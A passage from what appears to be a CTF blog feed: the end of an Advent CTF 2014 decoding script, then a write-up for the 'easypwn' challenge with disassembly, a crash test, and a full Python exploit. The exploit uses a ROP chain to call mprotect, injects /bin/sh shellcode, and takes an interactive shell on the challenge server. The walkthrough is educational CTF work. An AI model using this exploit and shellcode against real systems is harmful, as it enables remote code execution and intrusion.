</span><span class='line'><span class="n">decoded</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="k">while</span> <span class="n">going</span><span class="p">:</span>
</span><span class='line'>  <span class="k">try</span><span class="p">:</span>
</span><span class='line'>      <span class="n">f1</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">enc</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      <span class="n">f2</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">enc</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      
</span><span class='line'>      <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span> <span class="o">=</span> <span class="n">lookup</span><span class="p">[</span> <span class="p">(</span><span class="n">f1</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span><span class="o">+</span><span class="n">f2</span> <span class="p">]</span>
</span><span class='line'>      
</span><span class='line'>      <span class="n">decoded</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>      <span class="n">decoded</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
</span><span class='line'>  <span class="k">except</span><span class="p">:</span>
</span><span class='line'>      <span class="n">going</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>      <span class="k">print</span> <span class="n">decoded</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s <em>horrible</em> code, but it got the job done:</p>

<p><img src="http://barrebas.github.io/assets/adctf/rotate-flag.jpg" alt="" /></p>

<p>The flag was <code>ADCTF_TR0t4T3_f4C3</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Easypwn]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn/"/>
    <updated>2014-12-21T10:24:42+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn</id>
    <content type="html"><![CDATA[<p>Another pwnable, named &ldquo;easypwn&rdquo;, no less! Should be a walk in the park, right?</p>

<!-- more -->


<p>Of course, it turns out it wasn&rsquo;t! We&rsquo;re given only the executable. The challenge description informs us: no libs, ASLR enabled. Flag is in <code>/home/easypwn/flag</code>. Great! Disassembling the binary leads to the following code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>objdump -d easypwn -M intel
</span><span class='line'>
</span><span class='line'>easypwn:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'><span class="m">08048080</span> &lt;syscall&gt;:
</span><span class='line'> 8048080: 8b <span class="m">54</span> <span class="m">24</span> 0c           mov    edx,DWORD PTR <span class="o">[</span>esp+0xc<span class="o">]</span>
</span><span class='line'> 8048084: 8b 4c <span class="m">24</span> <span class="m">08</span>           mov    ecx,DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>
</span><span class='line'> 8048088: 8b 5c <span class="m">24</span> <span class="m">04</span>           mov    ebx,DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>
</span><span class='line'> 804808c: <span class="nb">cd </span><span class="m">80</span>                    int    0x80
</span><span class='line'> 804808e: c3                      ret
</span><span class='line'> 804808f: <span class="m">90</span>                       nop
</span><span class='line'>
</span><span class='line'><span class="m">08048090</span> &lt;pwn_me&gt;:
</span><span class='line'> 8048090: <span class="m">83</span> ec <span class="m">10</span>              sub    esp,0x10
</span><span class='line'> 8048093: b9 ed <span class="m">80</span> <span class="m">04</span> <span class="m">08</span>         mov    ecx,0x80480ed
</span><span class='line'> 8048098: b8 <span class="m">04</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x4          <span class="c"># write</span>
</span><span class='line'> 804809d: 6a <span class="m">08</span>                    push   0x8
</span><span class='line'> 804809f: <span class="m">51</span>                       push   ecx
</span><span class='line'> 80480a0: 6a <span class="m">01</span>                    push   0x1              <span class="c"># stdout</span>
</span><span class='line'> 80480a2: ff d6                   call   esi
</span><span class='line'> 80480a4: <span class="m">83</span> c4 0c                 add    esp,0xc
</span><span class='line'> 80480a7: <span class="m">89</span> e1                    mov    ecx,esp
</span><span class='line'> 80480a9: b8 <span class="m">03</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x3          <span class="c"># read</span>
</span><span class='line'> 80480ae: <span class="m">68</span> <span class="m">80</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   0x80             <span class="c"># 128 bytes</span>
</span><span class='line'> 80480b3: <span class="m">51</span>                       push   ecx
</span><span class='line'> 80480b4: 6a <span class="m">00</span>                    push   0x0              <span class="c"># stdin</span>
</span><span class='line'> 80480b6: ff d6                   call   esi
</span><span class='line'> 80480b8: <span class="m">83</span> c4 0c                 add    esp,0xc
</span><span class='line'> 80480bb: <span class="m">83</span> c4 <span class="m">10</span>              add    esp,0x10
</span><span class='line'> 80480be: c3                      ret
</span><span class='line'> 80480bf: <span class="m">90</span>                       nop
</span><span class='line'>
</span><span class='line'>080480c0 &lt;_start&gt;:
</span><span class='line'> 80480c0: <span class="m">56</span>                       push   esi
</span><span class='line'> 80480c1: be <span class="m">80</span> <span class="m">80</span> <span class="m">04</span> <span class="m">08</span>          mov    esi,0x8048080
</span><span class='line'> 80480c6: e8 c5 ff ff ff          call   <span class="m">8048090</span> &lt;pwn_me&gt;
</span><span class='line'> 80480cb: b9 f6 <span class="m">80</span> <span class="m">04</span> <span class="m">08</span>         mov    ecx,0x80480f6
</span><span class='line'> 80480d0: b8 <span class="m">04</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x4          <span class="c"># write</span>
</span><span class='line'> 80480d5: 6a <span class="m">13</span>                    push   0x13             <span class="c"># 0x13 bytes</span>
</span><span class='line'> 80480d7: <span class="m">51</span>                       push   ecx
</span><span class='line'> 80480d8: 6a <span class="m">01</span>                    push   0x1              <span class="c"># stdout</span>
</span><span class='line'> 80480da: ff d6                   call   esi
</span><span class='line'> 80480dc: <span class="m">83</span> c4 0c                 add    esp,0xc
</span><span class='line'> 80480df: b8 <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x1          <span class="c"># exit</span>
</span><span class='line'> 80480e4: 6a <span class="m">00</span>                    push   0x0
</span><span class='line'> 80480e6: ff d6                   call   esi
</span><span class='line'> 80480e8: <span class="m">83</span> c4 <span class="m">04</span>              add    esp,0x4
</span><span class='line'> 80480eb: 5e                      pop    esi
</span><span class='line'> 80480ec: c3                      ret
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s not a whole lot to work with. Running it gives a clue on what to do:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
</span><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>./easypwn
</span><span class='line'>pwn me: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>gdb ./easypwn core
</span><span class='line'>...snip...
</span><span class='line'>Core was generated by <span class="s1">&#39;./easypwn&#39;</span>.
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x45454545 in ?? ()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p>OK, so it&rsquo;s a buffer overflow, yet stack is not executable. The program uses no libraries but syscalls to do its work. We must be able to ROP our way to the flag! We have the syscall gadget lined up for us at <code>0x08048080</code>. Looks easy, right? Wrong!</p>

<p>There is one <strong>big</strong> problem:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="m">08048080</span> &lt;syscall&gt;:
</span><span class='line'> 8048080: 8b <span class="m">54</span> <span class="m">24</span> 0c           mov    edx,DWORD PTR <span class="o">[</span>esp+0xc<span class="o">]</span>
</span><span class='line'> 8048084: 8b 4c <span class="m">24</span> <span class="m">08</span>           mov    ecx,DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>
</span><span class='line'> 8048088: 8b 5c <span class="m">24</span> <span class="m">04</span>           mov    ebx,DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>
</span><span class='line'> 804808c: <span class="nb">cd </span><span class="m">80</span>                    int    0x80
</span><span class='line'> 804808e: c3                      ret
</span><span class='line'> 804808f: <span class="m">90</span>                       nop
</span></code></pre></td></tr></table></div></figure>


<p>We have <em>no way</em> to set <code>eax</code>! The <code>eax</code> register contains the syscall number and is kind of crucial to what we want. I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> but I found no straightforward way to set <code>eax</code>. I&rsquo;d prefer a <code>mov eax</code> or <code>pop eax</code>, or even <code>sub eax</code> or <code>xor eax</code>. Anything, really! I dumped the ROP gadgets with <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">my own tool</a> and found this little gadget:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>RET: 0x80480e9: les eax, <span class="o">[</span>esi+ebx*2<span class="o">]</span><span class="p">;</span> ret<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now this is a strange way to set <code>eax</code>. The <code>les</code> operand does the following: it loads the 48-bit value at the location of <code>esi+ebx*2</code> and sets <code>eax</code> to the first 32 bits and the <code>es</code> register to the last 16 bits. <em>However</em>, <code>es</code> does not tolerate just any old value. If the wrong value is passed, the program SEGFAULTS. To keep things simple, I looked for values in the binary like this: <code>0x0000000i, 0x0000</code>. This would load 0xi in <code>eax</code> and 0x0 in <code>es</code>.</p>

<p>It seemed nearly impossible to build a ROP chain that would open, read and write the data from the flag file. For instance, where would I write the filename? On the stack? ASLR is enabled so I&rsquo;d have no idea of knowing where the stack is. Instead, I went with a different strategy.</p>

<p>I am going to use the syscall <code>mprotect</code> to make the code section from 0x8048000 to 0x8049000 writeable. When this succeeds, I can use syscall <code>read</code> to read in any shellcode from stdin to the code section. Finally, I simply return to that region.</p>

<p>A problem here is that I can&rsquo;t set <code>eax</code> to 125 (==mprotect) with my little gadget. Instead, I re-use the return value of the last syscall before the buffer overflow: <code>read</code>! The return value of that syscall will be the number of bytes read&hellip; If we pass in 125 bytes as payload, then we get exactly the syscall number of mprotect in <code>eax</code>!</p>

<p>Here&rsquo;s what I came up with, bit by bit. I started the binary via socat, to emulate the target system:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>socat TCP-LISTEN:28099,fork EXEC:./easypwn
</span></code></pre></td></tr></table></div></figure>


<p>And this is the ROP chain I built:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'><span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x8048080</span>
</span><span class='line'><span class="n">POPRET</span> <span class="o">=</span> <span class="mh">0x80480eb</span>  <span class="c"># pop esi; ret</span>
</span><span class='line'><span class="n">ADDESP</span> <span class="o">=</span> <span class="mh">0x80480bb</span>  <span class="c"># add esp, 0x10; ret</span>
</span><span class='line'><span class="n">LESEAX</span> <span class="o">=</span> <span class="mh">0x80480e9</span>  <span class="c"># les eax,FWORD PTR [esi+ebx*2]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span>       <span class="c"># smash stack!</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>   <span class="c"># I rely on the return value of the read syscall</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack with add esp, 10; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address to modify</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># length (page-aligned!)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># PROT_READ|PROT_WRITE|PROT_EXEC</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy value</span>
</span><span class='line'>
</span><span class='line'><span class="c"># reset ebx so we can set eax using the next gadget</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># set ebx = 0</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy</span>
</span><span class='line'>
</span><span class='line'><span class="c"># set eax = 3</span>
</span><span class='line'><span class="c"># 0x804834a:  0x00000003  0x00000000</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRET</span><span class="p">)</span>    <span class="c"># pop esi; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804834a</span><span class="p">)</span> <span class="c"># set esi = 0x804834a</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LESEAX</span><span class="p">)</span>    <span class="c"># eax -&gt; 0x3 == syscall_read</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># stdin</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address of buffer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>        <span class="c"># number of bytes to read</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>      <span class="c"># dummy value</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># return to shellcode!</span>
</span><span class='line'>
</span><span class='line'><span class="c"># payload length must be 125, because after read, the next</span>
</span><span class='line'><span class="c"># syscall is mprotect; eax = 125</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">125</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&quot;localhost&quot;,28099))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;pwnable.katsudon.org&quot;</span><span class="p">,</span><span class="mi">28099</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># http://www.shell-storm.org/shellcode/files/shellcode-851.php</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the shell should have been spawned, so interact with it</span>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This first bit of python sets up the exploit. I have a helper function called <code>p(x)</code> that can dump addresses in the correct endianness into the payload. First, the payload consists of 16 bytes to smash the stack. Then, the ROP chain starts. Finally, I made sure that the first payload is 125 bytes, so that <code>eax</code> will contain the correct syscall number for mprotect. This first important part of the ROP chain looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>    <span class="c"># I rely on the return value of the read syscall</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack with add esp, 10; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address to modify</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># length (page-aligned!)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># PROT_READ|PROT_WRITE|PROT_EXEC</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy value</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will call <code>syscall(0x8048000, 0x1000, 0x7)</code> with <code>eax</code> set to 125. This makes the memory area at 0x8048000 writeable! Next, I need to read in the shellcode, but for that <code>eax</code> must be 3. I first reset <code>ebx</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># reset ebx so we can set eax using the next gadget</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># set ebx = 0</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy</span>
</span></code></pre></td></tr></table></div></figure>


<p>Whatever this syscall is (I don&rsquo;t know the value of <code>eax</code> after the mprotect call, nor do I care), it fails but the side-effect is that <code>ebx</code> is now 0. That sets us up for moving the correct number in <code>eax</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># set eax = 3</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">0x804834a:   0x00000003  0x00000000</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRET</span><span class="p">)</span>    <span class="c"># pop esi; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804834a</span><span class="p">)</span> <span class="c"># set esi = 0x804834a</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LESEAX</span><span class="p">)</span>    <span class="c"># eax -&gt; 0x3 == syscall_read</span>
</span></code></pre></td></tr></table></div></figure>


<p>First, I use a <code>pop esi; ret</code> gadget to set the value of <code>esi</code> to a 48 bit value that contains: 0x3, 0x0. Then I return to the little gadget to set <code>eax</code> (and <code>es</code>) using those values. This results in <code>eax</code> being the correct number for the next syscall, read:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># stdin</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address of buffer</span>
